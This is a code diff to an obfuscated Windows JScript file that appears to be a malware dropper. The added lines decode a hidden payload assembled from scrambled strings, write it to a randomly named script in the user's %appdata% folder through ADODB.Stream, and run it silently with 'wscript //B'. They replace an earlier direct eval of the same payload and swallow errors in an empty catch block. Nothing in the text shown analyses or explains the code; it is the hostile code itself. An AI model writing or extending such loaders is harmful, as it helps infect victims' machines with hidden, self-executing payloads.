@@ -16,7 +16,23 @@ var furduncio3 = superString3.replace(/codigo/g, "").replace(/!@/g, "A");
 
 var omaga = furduncio.concat(furduncio2, furduncio3);
 
-var maluco = eval(picole(omaga));
+var casca = WScript['CreateObject']("WScript" + "." + "Shell");
+var diterorio = casca['ExpandEnvironmentStrings']("%appdata%");
+var primeiroCaminho = diterorio + "\\tAhkoltMPs.js";
+var theCoded = picole(omaga);
+writeBytes(primeiroCaminho, theCoded);
+casca['run']("wscript //B \"" + primeiroCaminho + "\"");
+
+function writeBytes(file, bytes) {
+    try {
+        var binaryStream = WScript.CreateObject("ADODB.Stream");
+        binaryStream.Type = 1;
+        binaryStream.Open();
+        binaryStream.Write(bytes);
+        binaryStream.SaveToFile(file, 2);
+    } catch (err) {
+    }
+}
 
 function picole(omaga) {
     var xmlDOM = new ActiveXObject("Microsoft.XMLDOM");
